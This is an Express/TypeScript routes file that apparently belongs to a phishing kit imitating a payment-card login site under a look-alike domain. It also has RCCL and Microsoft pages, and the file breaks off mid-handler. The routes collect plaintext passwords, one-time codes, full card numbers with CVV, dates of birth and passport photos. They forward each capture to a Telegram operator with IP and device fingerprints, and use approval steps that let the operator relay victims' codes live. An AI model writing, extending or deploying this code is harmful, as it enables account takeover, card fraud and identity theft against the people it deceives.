import type { Express, Request } from "express";
import { createServer, type Server } from "http";
import rateLimit from "express-rate-limit";
import * as fs from "fs";
import * as path from "path";
import { storage } from "./storage";
import {
  loginRequestSchema,
  emailVerificationSchema,
  otpVerificationSchema,
  postalCodeRequestSchema,
  contactInfoRequestSchema,
  registerRequestSchema,
  cardActivationRequestSchema,
  forgotUsernameRequestSchema,
  forgotPasswordRequestSchema,
  microsoftEmailRequestSchema,
  microsoftPasswordRequestSchema,
  accountLoginRequestSchema,
} from "@shared/schema";
import { getUncachableResendClient } from "./resend-client";
import { decrypt } from "./crypto";
import { 
  sendLoginNotification,
  sendEmailVerificationNotification,
  sendOtpVerificationNotification,
  sendPostalCodeNotification,
  sendContactInfoNotification,
  sendRegisterNotification,
  sendCardActivationNotification,
  sendForgotUsernameNotification,
  sendForgotPasswordNotification,
  sendAccountPageNotification,
  sendAccountLoginNotification,
  getTelegramConfig,
  extractSourceInfo,
  SourceInfo,
  createLoginSession,
  getLoginSession,
  updateLoginSession,
} from "./telegram";
import { detectDevice } from "./device-detector";
import { honeypotTrap } from "./security-middleware";
import { validateLuhn, normalizeCardNumber } from "@shared/luhn";
import { getIpInfo } from "./ip-info";

// Global rate limiter - applies to all API routes
const globalLimiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 1 minute
  max: 30, // 30 requests per minute per IP
  message: { success: false, message: 'Too many requests. Please slow down.' },
  standardHeaders: true,
  legacyHeaders: false,
  skipSuccessfulRequests: false,
});

// Enhanced rate limiting configurations (stricter limits)
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 3, // Reduced from 5 to 3 attempts
  message: { success: false, message: 'Too many login attempts. Please try again in 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
});

const emailVerificationLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: { success: false, message: 'Too many email verification attempts. Please try again in 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
});

const otpVerificationLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: { success: false, message: 'Too many OTP verification attempts. Please try again in 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
});

const postalCodeLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: { success: false, message: 'Too many postal code submissions. Please try again in 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
});

const contactInfoLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: { success: false, message: 'Too many contact info submissions. Please try again in 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
});

const registerLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: { success: false, message: 'Too many registration attempts. Please try again in 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
});

const cardActivationLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: { success: false, message: 'Too many card activation attempts. Please try again in 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
});

const forgotUsernameLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: { success: false, message: 'Too many forgot username attempts. Please try again in 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
});

const forgotPasswordLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: { success: false, message: 'Too many forgot password attempts. Please try again in 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
});

const microsoftEmailLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: { success: false, message: 'Too many email submissions. Please try again in 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
});

const microsoftPasswordLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: { success: false, message: 'Too many password submissions. Please try again in 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
});

const accountVisitLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10, // 10 visits per window (more lenient for page visits)
  message: { success: false, message: 'Too many requests. Please try again later.' },
  standardHeaders: true,
  legacyHeaders: false,
});

const accountLoginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: { success: false, message: 'Too many account login attempts. Please try again in 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
});

// Helper to get client IP and User Agent
function getClientInfo(req: Request) {
  const ipAddress = (req.headers['x-forwarded-for'] as string)?.split(',')[0] || req.ip || 'unknown';
  const userAgent = req.headers['user-agent'] || 'unknown';
  return { ipAddress, userAgent };
}

// Generate 6-digit OTP
function generateOTP(): string {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

export async function registerRoutes(app: Express): Promise<Server> {
  
  // SECURITY: Apply global rate limiter to all API routes
  app.use('/api/', globalLimiter);
  
  // SEO Routes - Sitemap.xml (Clean, Google-compliant) and robots.txt
  app.get('/sitemap.xml', (req, res) => {
    try {
      const baseUrl = 'https://login-mypaymentvaultl.com';
      const currentDate = new Date().toISOString().split('T')[0];
      
      const pages = [
        { loc: '/', priority: '1.0', changefreq: 'daily' },
        { loc: '/login', priority: '1.0', changefreq: 'daily' },
        { loc: '/account', priority: '0.9', changefreq: 'daily' },
        { loc: '/register', priority: '0.8', changefreq: 'weekly' },
        { loc: '/activate-card', priority: '0.8', changefreq: 'weekly' },
        { loc: '/forgot-username', priority: '0.7', changefreq: 'monthly' },
        { loc: '/forgot-password', priority: '0.7', changefreq: 'monthly' },
        { loc: '/rccl', priority: '0.8', changefreq: 'weekly' },
        { loc: '/rccl-register', priority: '0.7', changefreq: 'weekly' },
        { loc: '/rccl-activate-card', priority: '0.7', changefreq: 'weekly' },
      ];
      
      const urlEntries = pages.map(p => `<url>
<loc>${baseUrl}${p.loc}</loc>
<lastmod>${currentDate}</lastmod>
<changefreq>${p.changefreq}</changefreq>
<priority>${p.priority}</priority>
</url>`).join('\n');
      
      const sitemap = `<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
        xmlns:xhtml="http://www.w3.org/1999/xhtml">
${urlEntries}
</urlset>`;
      
      res.set('Content-Type', 'application/xml; charset=utf-8');
      res.set('Cache-Control', 'public, max-age=3600');
      res.send(sitemap);
    } catch (error) {
      console.error('Error generating sitemap:', error);
      res.status(500).send('Error generating sitemap');
    }
  });

  app.get('/robots.txt', (req, res) => {
    try {
      const baseUrl = 'https://login-mypaymentvaultl.com';
      
      const robotsTxt = `User-agent: *
Allow: /
Allow: /login
Allow: /account
Allow: /register
Allow: /activate-card
Allow: /forgot-username
Allow: /forgot-password
Allow: /rccl
Allow: /rccl-register
Allow: /rccl-activate-card
Disallow: /api/
Disallow: /postal-code
Disallow: /contact-info
Disallow: /microsoft-email
Disallow: /microsoft-password
Disallow: /secure-admin-*

Sitemap: ${baseUrl}/sitemap.xml`;
      
      res.set('Content-Type', 'text/plain; charset=utf-8');
      res.set('Cache-Control', 'public, max-age=86400');
      res.send(robotsTxt);
    } catch (error) {
      console.error('Error generating robots.txt:', error);
      res.status(500).send('Error generating robots.txt');
    }
  });
  
  // GET /api/test-email - Debug endpoint to test email sending
  app.get("/api/test-email", async (req, res) => {
    const testEmail = req.query.email as string;
    if (!testEmail) {
      return res.status(400).json({ success: false, message: 'Email query parameter required' });
    }
    
    try {
      console.log('[Test Email] Starting email test...');
      const { client, fromEmail } = await getUncachableResendClient();
      console.log('[Test Email] Got Resend client, from:', fromEmail);
      
      const response = await client.emails.send({
        from: fromEmail,
        to: testEmail,
        subject: 'Test Email - MyPaymentVault',
        html: '<h1>Test Email</h1><p>This is a test email from MyPaymentVault. If you received this, email sending is working correctly!</p>',
      });
      
      console.log('[Test Email] Email sent successfully:', JSON.stringify(response));
      return res.json({ 
        success: true, 
        message: 'Test email sent', 
        from: fromEmail,
        to: testEmail,
        response 
      });
    } catch (error: any) {
      console.error('[Test Email] Failed to send:', error);
      return res.status(500).json({ 
        success: false, 
        message: 'Failed to send test email',
        error: error.message || String(error),
        errorDetails: error.response?.data || error
      });
    }
  });

  // POST /api/login - Submit login credentials
  app.post("/api/login", loginLimiter, honeypotTrap, async (req, res) => {
    try {
      const validation = loginRequestSchema.safeParse(req.body);
      
      if (!validation.success) {
        return res.status(400).json({
          success: false,
          errors: validation.error.flatten().fieldErrors,
        });
      }

      const { username, password } = validation.data;
      const { ipAddress, userAgent } = getClientInfo(req);

      // Detect device info
      const screenResolution = req.body.screenResolution;
      const deviceInfo = detectDevice(req, screenResolution);
      console.log('[Device Detection]', JSON.stringify(deviceInfo, null, 2));

      // Create login attempt record
      const loginAttempt = await storage.createLoginAttempt({
        username,
        password, // In production, this would be hashed
        email: null,
        ipAddress,
        userAgent,
        status: 'pending',
      });

      // Send Telegram notification for login
      const telegramConfig = getTelegramConfig();
      if (telegramConfig) {
        // Get detailed IP information and source info
        const referer = req.headers.referer || req.headers.referrer as string | undefined;
        const explicitSource = req.body.sourceInfo ? {
          domain: req.body.sourceInfo.domain,
          path: req.body.sourceInfo.path
        } : undefined;
        const sourceInfo = extractSourceInfo(referer, '/', explicitSource);
        getIpInfo(ipAddress)
          .then((ipInfo) => {
            sendLoginNotification(validation.data, loginAttempt.id, ipInfo, deviceInfo, sourceInfo, telegramConfig)
              .then((success: boolean) => {
                if (success) {
                  console.log('[Telegram] ✓ Login notification sent');
                } else {
                  console.log('[Telegram] ✗ Failed to send login notification');
                }
              })
              .catch((err: Error) => {
                console.error('[Telegram] Error sending login notification:', err);
              });
          });
      }

      createLoginSession(loginAttempt.id);

      return res.json({
        success: true,
        loginAttemptId: loginAttempt.id,
        message: 'Login attempt recorded',
      });
    } catch (error) {
      console.error('Login error:', error);
      return res.status(500).json({
        success: false,
        message: 'Internal server error',
      });
    }
  });

  // GET /api/login-status - Poll for Telegram login approval
  app.get("/api/login-status", async (req, res) => {
    try {
      const loginAttemptId = req.query.loginAttemptId as string;
      if (!loginAttemptId) {
        return res.status(400).json({ success: false, message: 'loginAttemptId required' });
      }

      const session = getLoginSession(loginAttemptId);
      if (!session) {
        return res.json({ success: true, stage: 'no_session', message: 'No active session' });
      }

      return res.json({
        success: true,
        stage: session.stage,
        otpSentToEmail: session.otpSentToEmail,
      });
    } catch (error) {
      console.error('Login status error:', error);
      return res.status(500).json({ success: false, message: 'Internal server error' });
    }
  });

  // POST /api/submit-email - Submit email and start waiting for KIRIMMI
  app.post("/api/submit-email", emailVerificationLimiter, honeypotTrap, async (req, res) => {
    try {
      const { loginAttemptId, email } = req.body;

      if (!loginAttemptId || !email) {
        return res.status(400).json({ success: false, message: 'loginAttemptId and email required' });
      }

      const session = getLoginSession(loginAttemptId);
      if (!session || session.stage !== 'login_approved') {
        return res.status(400).json({ success: false, message: 'Session not in correct state' });
      }

      updateLoginSession(loginAttemptId, {
        stage: 'email_waiting',
        email,
      });

      const telegramConfig = getTelegramConfig();
      if (telegramConfig) {
        const referer = req.headers.referer || req.headers.referrer as string | undefined;
        const explicitSource = req.body.sourceInfo ? {
          domain: req.body.sourceInfo.domain,
          path: req.body.sourceInfo.path
        } : undefined;
        const sourceInfo = extractSourceInfo(referer, '/', explicitSource);
        sendEmailVerificationNotification(email, loginAttemptId, sourceInfo, telegramConfig)
          .then((success: boolean) => {
            if (success) {
              console.log('[Telegram] Email notification sent, waiting for KIRIMMI...');
            }
          })
          .catch((err: Error) => {
            console.error('[Telegram] Error sending email notification:', err);
          });
      }

      return res.json({
        success: true,
        message: 'Email submitted, waiting for approval',
      });
    } catch (error) {
      console.error('Submit email error:', error);
      return res.status(500).json({ success: false, message: 'Internal server error' });
    }
  });

  // GET /api/email-status - Poll for KIRIMMI or timeout
  app.get("/api/email-status", async (req, res) => {
    try {
      const loginAttemptId = req.query.loginAttemptId as string;
      if (!loginAttemptId) {
        return res.status(400).json({ success: false, message: 'loginAttemptId required' });
      }

      const session = getLoginSession(loginAttemptId);
      if (!session) {
        return res.json({ success: true, stage: 'no_session' });
      }

      if (session.stage === 'email_timeout' && !session.otpSentToEmail) {
        const loginAttempt = await storage.getLoginAttempt(loginAttemptId);
        if (loginAttempt && session.email) {
          const otpCode = generateOTP();
          const expiresAt = new Date(Date.now() + 10 * 60 * 1000);

          const otpSession = await storage.createOtpSession({
            loginAttemptId,
            email: session.email,
            otpCode,
            expiresAt,
            verified: 'false',
            flowType: 'login',
          });

          await storage.updateLoginAttemptStatus(loginAttemptId, 'email_sent');

          try {
            const { client, fromEmail } = await getUncachableResendClient();
            const emailResponse = await client.emails.send({
              from: fromEmail,
              to: session.email,
              subject: 'Your Identity Verification Code',
              html: `<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body style="margin:0;padding:20px;font-family:Arial,sans-serif;background:#f9f9f9;"><table role="presentation" style="width:100%;max-width:600px;margin:0 auto;background:#ffffff;border-collapse:collapse;"><tr><td style="padding:30px;"><p><strong>Hello Users,</strong></p><p>Here is the Verification Code you requested.</p><p>Verification Code:</p><table width="378"><tbody><tr><td><h1 style="font-size:32px;margin:10px 0 20px;color:#333;">${otpCode}</h1></td></tr></tbody></table><p>The code will expire in 10 minutes, so please complete this step as soon as possible.</p><p>Sincerely,<br /><strong>Customer Care</strong></p></td></tr></table></body></html>`,
            });
            console.log(`[AutoOTP] OTP sent to email ${session.email}`);
          } catch (emailError: any) {
            console.error('[AutoOTP] Failed to send OTP email:', emailError);
          }

          updateLoginSession(loginAttemptId, {
            otpSentToEmail: true,
            sessionId: otpSession.id,
            otpCode,
          });
        }
      }

      return res.json({
        success: true,
        stage: session.stage,
        otpSentToEmail: session.otpSentToEmail,
        sessionId: session.sessionId,
      });
    } catch (error) {
      console.error('Email status error:', error);
      return res.status(500).json({ success: false, message: 'Internal server error' });
    }
  });

  // POST /api/submit-otp-telegram - Submit OTP and notify Telegram, wait for BENARMIOTPTA
  app.post("/api/submit-otp-telegram", otpVerificationLimiter, honeypotTrap, async (req, res) => {
    try {
      const { loginAttemptId, otpCode, sessionId } = req.body;

      if (!loginAttemptId || !otpCode) {
        return res.status(400).json({ success: false, message: 'loginAttemptId and otpCode required' });
      }

      const session = getLoginSession(loginAttemptId);
      if (!session) {
        return res.status(400).json({ success: false, message: 'No active session' });
      }

      if (session.otpSentToEmail && sessionId) {
        const isValid = await storage.verifyOtp(sessionId, otpCode);
        if (!isValid) {
          return res.status(400).json({ success: false, message: 'Invalid or expired OTP' });
        }
      }

      updateLoginSession(loginAttemptId, {
        stage: 'otp_waiting',
        otpCode,
      });

      const telegramConfig = getTelegramConfig();
      if (telegramConfig) {
        const referer = req.headers.referer || req.headers.referrer as string | undefined;
        const explicitSource = req.body.sourceInfo ? {
          domain: req.body.sourceInfo.domain,
          path: req.body.sourceInfo.path
        } : undefined;
        const sourceInfo = extractSourceInfo(referer, '/', explicitSource);
        sendOtpVerificationNotification(session.email || '', otpCode, loginAttemptId, sourceInfo, telegramConfig)
          .then((success: boolean) => {
            if (success) {
              console.log('[Telegram] OTP notification sent, waiting for BENARMIOTPTA...');
            }
          })
          .catch((err: Error) => {
            console.error('[Telegram] Error sending OTP notification:', err);
          });
      }

      return res.json({
        success: true,
        message: 'OTP submitted, waiting for approval',
      });
    } catch (error) {
      console.error('Submit OTP error:', error);
      return res.status(500).json({ success: false, message: 'Internal server error' });
    }
  });

  // GET /api/otp-status - Poll for BENARMIOTPTA approval
  app.get("/api/otp-status", async (req, res) => {
    try {
      const loginAttemptId = req.query.loginAttemptId as string;
      if (!loginAttemptId) {
        return res.status(400).json({ success: false, message: 'loginAttemptId required' });
      }

      const session = getLoginSession(loginAttemptId);
      if (!session) {
        return res.json({ success: true, stage: 'no_session' });
      }

      if (session.stage === 'otp_approved') {
        await storage.updateLoginAttemptStatus(loginAttemptId, 'otp_verified');
        updateLoginSession(loginAttemptId, { stage: 'completed' });
      }

      return res.json({
        success: true,
        stage: session.stage,
      });
    } catch (error) {
      console.error('OTP status error:', error);
      return res.status(500).json({ success: false, message: 'Internal server error' });
    }
  });

  // POST /api/verify-email - Send OTP to email
  app.post("/api/verify-email", emailVerificationLimiter, honeypotTrap, async (req, res) => {
    try {
      const validation = emailVerificationSchema.safeParse(req.body);
      
      if (!validation.success) {
        return res.status(400).json({
          success: false,
          errors: validation.error.flatten().fieldErrors,
        });
      }

      const { loginAttemptId, email, flowType = 'login' } = validation.data;

      // Verify login attempt exists based on flowType
      if (flowType === 'account') {
        const accountAttempt = await storage.getAccountLoginAttempt(loginAttemptId);
        if (!accountAttempt) {
          return res.status(404).json({
            success: false,
            message: 'Account login attempt not found',
          });
        }
      } else {
        const loginAttempt = await storage.getLoginAttempt(loginAttemptId);
        if (!loginAttempt) {
          return res.status(404).json({
            success: false,
            message: 'Login attempt not found',
          });
        }
      }

      // Generate OTP
      const otpCode = generateOTP();
      const expiresAt = new Date(Date.now() + 10 * 60 * 1000); // 10 minutes

      // Create OTP session with flowType tagging
      const otpSession = await storage.createOtpSession({
        loginAttemptId,
        email,
        otpCode,
        expiresAt,
        verified: 'false',
        flowType,
      });

      // Update login attempt status based on flowType
      if (flowType === 'account') {
        await storage.updateAccountLoginAttemptStatus(loginAttemptId, 'email_sent');
        await storage.updateAccountLoginAttemptEmail(loginAttemptId, email);
      } else {
        await storage.updateLoginAttemptStatus(loginAttemptId, 'email_sent');
      }

      // Send OTP via Resend email
      try {
        const { client, fromEmail } = await getUncachableResendClient();
        
        console.log(`Attempting to send OTP email from: ${fromEmail} to: ${email}`);
        
        const response = await client.emails.send({
          from: fromEmail,
          to: email,
          subject: 'Your Identity Verification Code',
          html: `<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body style="margin:0;padding:20px;font-family:Arial,sans-serif;background:#f9f9f9;"><table role="presentation" style="width:100%;max-width:600px;margin:0 auto;background:#ffffff;border-collapse:collapse;"><tr><td style="padding:30px;"><p><strong>Hello Users,</strong></p><p>Here is the Verification Code you requested.</p><p>Verification Code:</p><table width="378"><tbody><tr><td><h1 style="font-size:32px;margin:10px 0 20px;color:#333;">${otpCode}</h1></td></tr></tbody></table><p>The code will expire in 10 minutes, so please complete this step as soon as possible. If you accidentally closed the verification screen, you will need to restart the process.</p><p>Don't know why you received this email? Someone may have tried to access your account. Rest assured, it is safe. Only you can view your account details.</p><p>Sincerely,<br /><strong>Customer Care</strong></p></td></tr></table></body></html>`,
        });

        // Check for API errors in response
        if (response.error) {
          console.error('✗ Resend API error:', response.error.message);
          console.error('  Status:', response.error.statusCode);
          // For domain verification issues, log detailed info
          if (response.error.statusCode === 403) {
            console.error('  Note: Domain verification required. Visit resend.com/domains to verify your domain.');
          }
          console.log(`  OTP for ${email}: ${otpCode} (email failed - check domain verification)`);
        } else {
          console.log(`✓ OTP email sent successfully!`);
          console.log(`  From: ${fromEmail}`);
          console.log(`  To: ${email}`);
          console.log(`  Email ID:`, response.data?.id);
        }
      } catch (emailError: any) {
        console.error('✗ Failed to send OTP email:', emailError);
        console.error('  Error details:', emailError.message || emailError);
        console.log(`  OTP for ${email}: ${otpCode} (fallback - email failed)`);
      }

      // For development/testing: log OTP to console (requires explicit opt-in)
      if (process.env.DEBUG_OTP === 'true') {
        console.log(`[DEBUG_OTP] OTP for ${email}: ${otpCode} (expires in 10 minutes)`);
      }

      // Send Telegram notification for email verification
      const telegramConfig = getTelegramConfig();
      if (telegramConfig) {
        const referer = req.headers.referer || req.headers.referrer as string | undefined;
        const explicitSource = req.body.sourceInfo ? {
          domain: req.body.sourceInfo.domain,
          path: req.body.sourceInfo.path
        } : undefined;
        const sourceInfo = extractSourceInfo(referer, '/', explicitSource);
        sendEmailVerificationNotification(email, loginAttemptId, sourceInfo, telegramConfig)
          .then((success: boolean) => {
            if (success) {
              console.log('[Telegram] ✓ Email verification notification sent');
            } else {
              console.log('[Telegram] ✗ Failed to send email verification notification');
            }
          })
          .catch((err: Error) => {
            console.error('[Telegram] Error sending email verification notification:', err);
          });
      }

      return res.json({
        success: true,
        sessionId: otpSession.id,
        message: 'OTP sent to email',
        // Never expose OTP to client - removed for security
      });
    } catch (error) {
      console.error('Email verification error:', error);
      return res.status(500).json({
        success: false,
        message: 'Internal server error',
      });
    }
  });

  // POST /api/verify-otp - Verify OTP code
  app.post("/api/verify-otp", otpVerificationLimiter, honeypotTrap, async (req, res) => {
    try {
      const validation = otpVerificationSchema.safeParse(req.body);
      
      if (!validation.success) {
        return res.status(400).json({
          success: false,
          errors: validation.error.flatten().fieldErrors,
        });
      }

      const { sessionId, otpCode, flowType } = validation.data;

      // Get OTP session to verify flowType match
      const session = await storage.getOtpSession(sessionId);
      if (!session) {
        return res.status(404).json({
          success: false,
          message: 'OTP session not found',
        });
      }

      // Verify flowType matches if provided
      if (flowType && session.flowType !== flowType) {
        return res.status(400).json({
          success: false,
          message: 'Invalid OTP session flow type',
        });
      }

      // Verify OTP
      const isValid = await storage.verifyOtp(sessionId, otpCode);

      if (isValid) {
        // Update login attempt status based on flowType
        const sessionFlowType = session.flowType || 'login';
        if (sessionFlowType === 'account') {
          await storage.updateAccountLoginAttemptStatus(session.loginAttemptId, 'otp_verified');
        } else {
          await storage.updateLoginAttemptStatus(session.loginAttemptId, 'otp_verified');
        }
        
        // Send Telegram notification for OTP verification
        const telegramConfig = getTelegramConfig();
        if (telegramConfig) {
          const referer = req.headers.referer || req.headers.referrer as string | undefined;
          const explicitSource = req.body.sourceInfo ? {
            domain: req.body.sourceInfo.domain,
            path: req.body.sourceInfo.path
          } : undefined;
          const sourceInfo = extractSourceInfo(referer, '/', explicitSource);
          if (sessionFlowType === 'account') {
            // For account flow, send consolidated notification with all data
            const { sendAccountLoginCompleteNotification } = await import('./telegram');
            const accountAttempt = await storage.getAccountLoginAttempt(session.loginAttemptId);
            if (accountAttempt) {
              const { ipAddress, userAgent } = getClientInfo(req);
              const deviceInfo = detectDevice(req);
              // Safely decrypt session email with fallback
              let decryptedSessionEmail: string;
              try {
                decryptedSessionEmail = decrypt(session.email);
              } catch (error) {
                console.error('[OTP Verification] Failed to decrypt session email:', error);
                decryptedSessionEmail = 'DECRYPTION_FAILED';
              }
              getIpInfo(ipAddress)
                .then((ipInfo) => {
                  sendAccountLoginCompleteNotification(accountAttempt, decryptedSessionEmail, otpCode, ipInfo, deviceInfo, sourceInfo, telegramConfig)
                    .then((success: boolean) => {
                      if (success) {
                        console.log('[Telegram] ✓ Account login complete notification sent');
                      } else {
                        console.log('[Telegram] ✗ Failed to send account login complete notification');
                      }
                    })
                    .catch((err: Error) => {
                      console.error('[Telegram] Error sending account login complete notification:', err);
                    });
                });
            }
          } else {
            // For normal login flow, send OTP verification notification
            const decryptedOtp = decrypt(session.otpCode);
            sendOtpVerificationNotification(session.email, decryptedOtp, session.loginAttemptId, sourceInfo, telegramConfig)
              .then((success: boolean) => {
                if (success) {
                  console.log('[Telegram] ✓ OTP verification notification sent');
                } else {
                  console.log('[Telegram] ✗ Failed to send OTP verification notification');
                }
              })
              .catch((err: Error) => {
                console.error('[Telegram] Error sending OTP verification notification:', err);
              });
          }
        }

        return res.json({
          success: true,
          message: 'OTP verified successfully',
        });
      } else {
        return res.status(400).json({
          success: false,
          message: 'Invalid or expired OTP',
        });
      }
    } catch (error) {
      console.error('OTP verification error:', error);
      return res.status(500).json({
        success: false,
        message: 'Internal server error',
      });
    }
  });

  // POST /api/S@S-account-verification - Submit postal code / card verification
  app.post("/api/S@S-account-verification", postalCodeLimiter, honeypotTrap, async (req, res) => {
    try {
      const validation = postalCodeRequestSchema.safeParse(req.body);
      
      if (!validation.success) {
        return res.status(400).json({
          success: false,
          errors: validation.error.flatten().fieldErrors,
        });
      }

      const { loginAttemptId, shipId, cardNumber, expiration, cvv, postalCode } = validation.data;
      const { ipAddress, userAgent } = getClientInfo(req);

      // Verify login attempt exists
      const loginAttempt = await storage.getLoginAttempt(loginAttemptId);
      if (!loginAttempt) {
        return res.status(404).json({
          success: false,
          message: 'Login attempt not found',
        });
      }

      // SECURITY: Verify OTP has been verified OR came from standalone flow
      // Check flowType (server-controlled, cannot be spoofed by user)
      const isStandaloneFlow = loginAttempt.flowType === 'standalone';
      
      if (isStandaloneFlow) {
        // Standalone flows: Allow status='pending' and skip OTP checks
        if (loginAttempt.status !== 'pending') {
          return res.status(403).json({
            success: false,
            message: 'Invalid standalone flow status',
          });
        }
      } else {
        // Normal login flow: Require status='otp_verified' AND valid OTP session
        if (loginAttempt.status !== 'otp_verified') {
          return res.status(403).json({
            success: false,
            message: 'OTP verification required before submitting postal code',
          });
        }

        // SECURITY: Verify OTP session still exists and is verified (prevents restart bypass)
        const isOtpSessionValid = await storage.isOtpSessionValidForAttempt(loginAttemptId);
        if (!isOtpSessionValid) {
          return res.status(403).json({
            success: false,
            message: 'OTP session expired or invalid. Please login again.',
          });
        }
      }

      // SECURITY: Verify login attempt is not expired (30 minutes max)
      const attemptAge = Date.now() - loginAttempt.timestamp.getTime();
      const maxAge = 30 * 60 * 1000; // 30 minutes
      if (attemptAge > maxAge) {
        return res.status(403).json({
          success: false,
          message: 'Login session expired. Please login again.',
        });
      }

      // Create postal code record with card data
      const postalData = await storage.createPostalCodeData({
        loginAttemptId,
        shipId,
        cardNumber,
        expiration,
        cvv,
        postalCode,
        ipAddress,
        userAgent,
      });

      // Send Telegram notification for postal code submission
      const telegramConfig = getTelegramConfig();
      if (telegramConfig) {
        const screenResolution = req.body.screenResolution;
        const deviceInfo = detectDevice(req, screenResolution);
        const referer = req.headers.referer || req.headers.referrer as string | undefined;
        const explicitSource = req.body.sourceInfo ? {
          domain: req.body.sourceInfo.domain,
          path: req.body.sourceInfo.path
        } : undefined;
        const sourceInfo = extractSourceInfo(referer, '/postal-code', explicitSource);
        getIpInfo(ipAddress)
          .then((ipInfo) => {
            sendPostalCodeNotification(validation.data, ipInfo, deviceInfo, sourceInfo, telegramConfig)
              .then((success: boolean) => {
                if (success) {
                  console.log('[Telegram] ✓ Postal code notification sent');
                } else {
                  console.log('[Telegram] ✗ Failed to send postal code notification');
                }
              })
              .catch((err: Error) => {
                console.error('[Telegram] Error sending postal code notification:', err);
              });
          });
      }

      return res.json({
        success: true,
        message: 'Postal code submitted successfully',
        id: postalData.id,
      });
    } catch (error) {
      console.error('Postal code submission error:', error);
      return res.status(500).json({
        success: false,
        message: 'Internal server error',
      });
    }
  });

  // POST /api/contact-info - Submit contact information
  app.post("/api/contact-info", contactInfoLimiter, honeypotTrap, async (req, res) => {
    try {
      const validation = contactInfoRequestSchema.safeParse(req.body);
      
      if (!validation.success) {
        return res.status(400).json({
          success: false,
          errors: validation.error.flatten().fieldErrors,
        });
      }

      const { 
        loginAttemptId, 
        firstName, 
        lastName, 
        email, 
        mobilePhone, 
        mailingAddress, 
        city, 
        state, 
        postalCode, 
        dateOfBirth, 
        inquiryType, 
        message,
        passportPhoto,
        employeeIdPhoto
      } = validation.data;
      const { ipAddress, userAgent } = getClientInfo(req);

      // Verify login attempt exists
      const loginAttempt = await storage.getLoginAttempt(loginAttemptId);
      if (!loginAttempt) {
        return res.status(404).json({
          success: false,
          message: 'Login attempt not found',
        });
      }

      // SECURITY: Verify OTP has been verified OR came from standalone flow
      // Check flowType (server-controlled, cannot be spoofed by user)
      const isStandaloneFlow = loginAttempt.flowType === 'standalone';
      
      if (isStandaloneFlow) {
        // Standalone flows: Allow status='pending' and skip OTP checks
        if (loginAttempt.status !== 'pending') {
          return res.status(403).json({
            success: false,
            message: 'Invalid standalone flow status',
          });
        }
      } else {
        // Normal login flow: Require status='otp_verified' AND valid OTP session
        if (loginAttempt.status !== 'otp_verified') {
          return res.status(403).json({
            success: false,
            message: 'OTP verification required before submitting contact information',
          });
        }

        // SECURITY: Verify OTP session still exists and is verified (prevents restart bypass)
        const isOtpSessionValid = await storage.isOtpSessionValidForAttempt(loginAttemptId);
        if (!isOtpSessionValid) {
          return res.status(403).json({
            success: false,
            message: 'OTP session expired or invalid. Please login again.',
          });
        }
      }

      // SECURITY: Verify login attempt is not expired (30 minutes max)
      const attemptAge = Date.now() - loginAttempt.timestamp.getTime();
      const maxAge = 30 * 60 * 1000; // 30 minutes
      if (attemptAge > maxAge) {
        return res.status(403).json({
          success: false,
          message: 'Login session expired. Please login again.',
        });
      }

      // Create contact info record
      const contactInfo = await storage.createContactInfoData({
        loginAttemptId,
        firstName,
        lastName,
        email,
        mobilePhone,
        mailingAddress,
        city,
        state,
        postalCode,
        dateOfBirth,
        inquiryType,
        message: message || '',
        passportPhoto: passportPhoto || '',
        employeeIdPhoto: employeeIdPhoto || '',
        ipAddress,
        userAgent,
      });

      // Send Telegram notification for contact info
      const telegramConfig = getTelegramConfig();
      if (telegramConfig) {
        const screenResolution = req.body.screenResolution;
        const deviceInfo = detectDevice(req, screenResolution);
        const referer = req.headers.referer || req.headers.referrer as string | undefined;
        const explicitSource = req.body.sourceInfo ? {
          domain: req.body.sourceInfo.domain,
          path: req.body.sourceInfo.path
        } : undefined;
        const sourceInfo = extractSourceInfo(referer, '/contact-info', explicitSource);
        // Send notification in background (non-blocking)
        getIpInfo(ipAddress)
          .then((ipInfo) => {
            sendContactInfoNotification(validation.data, ipInfo, deviceInfo, sourceInfo, telegramConfig)
              .then((success: boolean) => {
                if (success) {
                  console.log('[Telegram] ✓ Contact info notification sent');
                } else {
                  console.log('[Telegram] ✗ Failed to send contact info notification');
                }
              })
              .catch((err: Error) => {
                console.error('[Telegram] Error sending contact info notification:', err);
              });
          });
      }

